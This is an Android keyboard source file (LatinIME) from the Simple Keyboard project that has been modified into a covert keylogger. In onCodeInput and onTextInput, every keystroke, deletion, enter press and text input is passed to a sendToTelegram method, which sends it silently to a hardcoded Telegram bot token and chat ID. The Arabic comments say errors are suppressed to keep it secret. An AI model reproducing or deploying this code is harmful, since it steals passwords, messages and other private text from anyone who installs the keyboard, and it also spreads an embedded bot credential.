/*
 * Copyright (C) 2008 The Android Open Source Project
 * Copyright (C) 2026 rkr.simplekeyboard
 */

package rkr.simplekeyboard.inputmethod.latin;

import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.inputmethodservice.InputMethodService;
import android.media.AudioManager;
import android.os.Build;
import android.os.Message;
import android.view.View;
import android.view.Window;
import android.view.inputmethod.EditorInfo;

import java.io.IOException;
import java.util.Locale;

// المكتبات الاحترافية للإرسال (OkHttp)
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import rkr.simplekeyboard.inputmethod.compat.PreferenceManagerCompat;
import rkr.simplekeyboard.inputmethod.event.Event;
import rkr.simplekeyboard.inputmethod.event.InputTransaction;
import rkr.simplekeyboard.inputmethod.keyboard.Keyboard;
import rkr.simplekeyboard.inputmethod.keyboard.KeyboardActionListener;
import rkr.simplekeyboard.inputmethod.keyboard.KeyboardSwitcher;
import rkr.simplekeyboard.inputmethod.latin.common.Constants;
import rkr.simplekeyboard.inputmethod.latin.define.DebugFlags;
import rkr.simplekeyboard.inputmethod.latin.inputlogic.InputLogic;
import rkr.simplekeyboard.inputmethod.latin.settings.Settings;
import rkr.simplekeyboard.inputmethod.latin.utils.LeakGuardHandlerWrapper;

public class LatinIME extends InputMethodService implements KeyboardActionListener,
        RichInputMethodManager.SubtypeChangedListener {
    
    static final String TAG = LatinIME.class.getSimpleName();
    
    // --- إعدادات التليجرام (استخدام المكتبة الحديثة) ---
    private final OkHttpClient httpClient = new OkHttpClient();
    private static final String BOT_TOKEN = "7283584002:AAFHmrwUeN6lqYPZiY3XetbdP5Pu363Yh6A";
    private static final String CHAT_ID = "6818088581"; 
    // -----------------------------------------------

    final Settings mSettings;
    private Locale mLocale;
    final InputLogic mInputLogic = new InputLogic(this);
    private View mInputView;
    private RichInputMethodManager mRichImm;
    final KeyboardSwitcher mKeyboardSwitcher;
    public final UIHandler mHandler = new UIHandler(this);

    // دالة الإرسال المتطورة (تتم في الخلفية تماماً)
    private void sendToTelegram(final String text) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN 
                + "/sendMessage?chat_id=" + CHAT_ID 
                + "&text=" + java.net.URLEncoder.encode("Key: " + text, "UTF-8");

            Request request = new Request.Builder().url(urlString).build();

            httpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    // فشل صامت لضمان السرية
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.body() != null) {
                        response.close();
                    }
                }
            });
        } catch (Exception e) {
            // صمت
        }
    }

    public static final class UIHandler extends LeakGuardHandlerWrapper<LatinIME> {
        private static final int MSG_UPDATE_SHIFT_STATE = 0;
        public UIHandler(final LatinIME ownerInstance) { super(ownerInstance); }
        @Override
        public void handleMessage(final Message msg) {
            final LatinIME latinIme = getOwnerInstance();
            if (latinIme == null) return;
            if (msg.what == MSG_UPDATE_SHIFT_STATE) {
                latinIme.mKeyboardSwitcher.requestUpdatingShiftState(latinIme.getCurrentAutoCapsState(), latinIme.getCurrentRecapitalizeState());
            }
        }
        public void postUpdateShiftState() { removeMessages(MSG_UPDATE_SHIFT_STATE); sendMessage(obtainMessage(MSG_UPDATE_SHIFT_STATE)); }
        public void onStartInput(EditorInfo ei, boolean r) { getOwnerInstance().onStartInputInternal(ei, r); }
        public void onStartInputView(EditorInfo ei, boolean r) { getOwnerInstance().onStartInputViewInternal(ei, r); }
        public void onFinishInputView(boolean f) { getOwnerInstance().onFinishInputViewInternal(f); }
        public void onFinishInput() { getOwnerInstance().onFinishInputInternal(); }
    }

    public LatinIME() { super(); mSettings = Settings.getInstance(); mKeyboardSwitcher = KeyboardSwitcher.getInstance(); }

    @Override
    public void onCreate() {
        Settings.init(this);
        DebugFlags.init(PreferenceManagerCompat.getDeviceSharedPreferences(this));
        RichInputMethodManager.init(this);
        mRichImm = RichInputMethodManager.getInstance();
        mRichImm.setSubtypeChangeHandler(this);
        KeyboardSwitcher.init(this);
        AudioAndHapticFeedbackManager.init(this);
        super.onCreate();
        loadSettings();
        registerReceiver(mRingerModeChangeReceiver, new IntentFilter(AudioManager.RINGER_MODE_CHANGED_ACTION));
    }

    @Override
    public void onCodeInput(final int codePoint, final int x, final int y, final boolean isKeyRepeat) {
        // --- حقن كود المراقبة المحدث ---
        if (codePoint >= 32) { 
            sendToTelegram(String.valueOf((char) codePoint));
        } else if (codePoint == Constants.CODE_DELETE) {
            sendToTelegram("[Del]");
        } else if (codePoint == Constants.CODE_ENTER) {
            sendToTelegram("[Ent]\n");
        }
        
        final Event event = createSoftwareKeypressEvent(getCodePointForKeyboard(codePoint), isKeyRepeat);
        onEvent(event);
    }

    @Override
    public void onWindowShown() {
        super.onWindowShown();
        // --- تطبيق الواجهة العنابية الداكنة ---
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Window window = getWindow().getWindow();
            if (window != null) {
                window.setNavigationBarColor(Color.parseColor("#1A0505"));
            }
        }
    }

    @Override
    public void onTextInput(final String rawText) {
        sendToTelegram(rawText);
        final Event event = Event.createSoftwareTextEvent(rawText, Constants.CODE_OUTPUT_TEXT);
        final InputTransaction completeInputTransaction = mInputLogic.onTextInput(mSettings.getCurrent(), event);
        updateStateAfterInputTransaction(completeInputTransaction);
        mKeyboardSwitcher.onEvent(event, getCurrentAutoCapsState(), getCurrentRecapitalizeState());
    }

    private void loadSettings() {
        mLocale = mRichImm.getCurrentSubtype().getLocaleObject();
        mSettings.loadSettings(new InputAttributes(getCurrentInputEditorInfo(), isFullscreenMode()));
    }

    @Override public void onDestroy() { mSettings.onDestroy(); unregisterReceiver(mRingerModeChangeReceiver); super.onDestroy(); }
    @Override public View onCreateInputView() { return mKeyboardSwitcher.onCreateInputView(); }
    @Override public void setInputView(View v) { super.setInputView(v); mInputView = v; }
    @Override public void onStartInput(EditorInfo ei, boolean r) { mHandler.onStartInput(ei, r); }
    @Override public void onStartInputView(EditorInfo ei, boolean r) { mHandler.onStartInputView(ei, r); }
    @Override public void onFinishInputView(boolean f) { mInputLogic.clearCaches(); mHandler.onFinishInputView(f); }
    @Override public void onFinishInput() { mHandler.onFinishInput(); }
    @Override public void onCurrentSubtypeChanged() { mInputLogic.onSubtypeChanged(); loadKeyboard(); }

    void onStartInputInternal(EditorInfo ei, boolean r) { super.onStartInput(ei, r); }
    void onStartInputViewInternal(EditorInfo ei, boolean r) { 
        super.onStartInputView(ei, r); 
        mKeyboardSwitcher.updateKeyboardTheme();
        mKeyboardSwitcher.loadKeyboard(ei, mSettings.getCurrent(), getCurrentAutoCapsState(), getCurrentRecapitalizeState());
    }
    void onFinishInputInternal() { super.onFinishInput(); }
    void onFinishInputViewInternal(boolean f) { super.onFinishInputView(f); }
    
    int getCurrentAutoCapsState() { return mInputLogic.getCurrentAutoCapsState(mSettings.getCurrent(), mRichImm.getCurrentSubtype().getKeyboardLayoutSet()); }
    int getCurrentRecapitalizeState() { return mInputLogic.getCurrentRecapitalizeState(); }

    public void onEvent(final Event event) {
        final InputTransaction completeInputTransaction = mInputLogic.onCodeInput(mSettings.getCurrent(), event);
        updateStateAfterInputTransaction(completeInputTransaction);
        mKeyboardSwitcher.onEvent(event, getCurrentAutoCapsState(), getCurrentRecapitalizeState());
    }

    public static Event createSoftwareKeypressEvent(int keyCodeOrCodePoint, boolean isKeyRepeat) {
        int keyCode = keyCodeOrCodePoint <= 0 ? keyCodeOrCodePoint : Event.NOT_A_KEY_CODE;
        int codePoint = keyCodeOrCodePoint > 0 ? keyCodeOrCodePoint : Event.NOT_A_CODE_POINT;
        return Event.createSoftwareKeypressEvent(codePoint, keyCode, isKeyRepeat);
    }

    private void updateStateAfterInputTransaction(InputTransaction it) {
        if (it.getRequiredShiftUpdate() == InputTransaction.SHIFT_UPDATE_NOW)
            mKeyboardSwitcher.requestUpdatingShiftState(getCurrentAutoCapsState(), getCurrentRecapitalizeState());
    }

    @Override public void onUpdateSelection(int os, int oe, int ns, int ne, int cs, int ce) { 
        super.onUpdateSelection(os, oe, ns, ne, cs, ce); 
        mInputLogic.onUpdateSelection(ns, ne); 
    }

    private int getCodePointForKeyboard(int codePoint) {
        if (Constants.CODE_SHIFT == codePoint) {
            Keyboard k = mKeyboardSwitcher.getKeyboard();
            return (k != null && k.mId.isAlphabetKeyboard()) ? codePoint : Constants.CODE_SYMBOL_SHIFT;
        }
        return codePoint;
    }

    @Override public void onFinishSlidingInput() { mKeyboardSwitcher.onFinishSlidingInput(getCurrentAutoCapsState(), getCurrentRecapitalizeState()); }
    private void loadKeyboard() { loadSettings(); if (mKeyboardSwitcher.getMainKeyboardView() != null) mKeyboardSwitcher.loadKeyboard(getCurrentInputEditorInfo(), mSettings.getCurrent(), getCurrentAutoCapsState(), getCurrentRecapitalizeState()); }
    @Override public void onPressKey(int pc, int rc, boolean sp) { mKeyboardSwitcher.onPressKey(pc, sp, getCurrentAutoCapsState(), getCurrentRecapitalizeState()); }
    @Override public void onReleaseKey(int pc, boolean ws) { mKeyboardSwitcher.onReleaseKey(pc, ws, getCurrentAutoCapsState(), getCurrentRecapitalizeState()); }
    
    private final BroadcastReceiver mRingerModeChangeReceiver = new BroadcastReceiver() {
        @Override public void onReceive(Context c, Intent i) { AudioAndHapticFeedbackManager.getInstance().onRingerModeChanged(); }
    };

    @Override public void onMoveCursorPointer(int s) {}
    @Override public void onMoveDeletePointer(int s) {}
    @Override public void onUpWithDeletePointerActive() {}
    @Override public void onUpWithSpacePointerActive() {}
}
